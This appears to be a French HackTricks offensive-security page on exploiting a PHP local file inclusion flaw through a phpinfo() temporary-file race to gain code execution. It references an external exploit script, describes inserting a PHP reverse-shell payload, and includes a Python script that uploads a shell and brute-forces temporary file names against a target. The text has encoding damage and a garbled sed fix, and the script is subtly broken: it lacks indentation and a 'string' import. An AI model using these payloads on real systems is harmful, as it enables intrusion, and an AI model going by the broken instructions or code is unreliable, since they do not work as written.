<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


Pour exploiter cette vuln√©rabilit√©, vous avez besoin de: **Une vuln√©rabilit√© LFI, une page o√π phpinfo() est affich√©, "file\_uploads = on" et le serveur doit pouvoir √©crire dans le r√©pertoire "/tmp".**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**Tutorial HTB**: [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

Vous devez corriger l'exploit (remplacer **=>** par **=>**). Pour ce faire, vous pouvez:
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
Vous devez √©galement modifier la **charge utile** au d√©but de l'exploit (pour un shell invers√© php par exemple), le **REQ1** (cela devrait pointer vers la page phpinfo et inclure le rembourrage, c'est-√†-dire : _REQ1="""POST /install.php?mode=phpinfo\&a="""+rembourrage+""" HTTP/1.1_), et **LFIREQ** (cela devrait pointer vers la vuln√©rabilit√© LFI, c'est-√†-dire : _LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ V√©rifiez le double "%" lors de l'exploitation du caract√®re nul)

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### Th√©orie

Si les t√©l√©versements sont autoris√©s en PHP et que vous essayez de t√©l√©verser un fichier, ce fichier est stock√© dans un r√©pertoire temporaire jusqu'√† ce que le serveur ait termin√© de traiter la demande, puis ce fichier temporaire est supprim√©.

Ensuite, si vous avez trouv√© une vuln√©rabilit√© LFI dans le serveur web, vous pouvez essayer de deviner le nom du fichier temporaire cr√©√© et exploiter une RCE en acc√©dant au fichier temporaire avant sa suppression.

Sous **Windows**, les fichiers sont g√©n√©ralement stock√©s dans **C:\Windows\temp\php**

Sous **Linux**, le nom du fichier est g√©n√©ralement **al√©atoire** et situ√© dans **/tmp**. Comme le nom est al√©atoire, il est n√©cessaire d'**extraire de quelque part le nom du fichier temporaire** et d'y acc√©der avant sa suppression. Cela peut √™tre fait en lisant la valeur de la **variable $\_FILES** dans le contenu de la fonction "**phpconfig()**".

**phpinfo()**

**PHP** utilise un tampon de **4096B** et lorsqu'il est **plein**, il est **envoy√© au client**. Ensuite, le client peut **envoyer** **beaucoup de grandes demandes** (en utilisant de grands en-t√™tes) **t√©l√©versant un php** shell invers√©, attendre que la **premi√®re partie de phpinfo() soit renvoy√©e** (o√π se trouve le nom du fichier temporaire) et essayer d'**acc√©der au fichier temporaire** avant que le serveur php ne supprime le fichier en exploitant une vuln√©rabilit√© LFI.

**Script Python pour essayer de forcer le nom (si la longueur = 6)**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
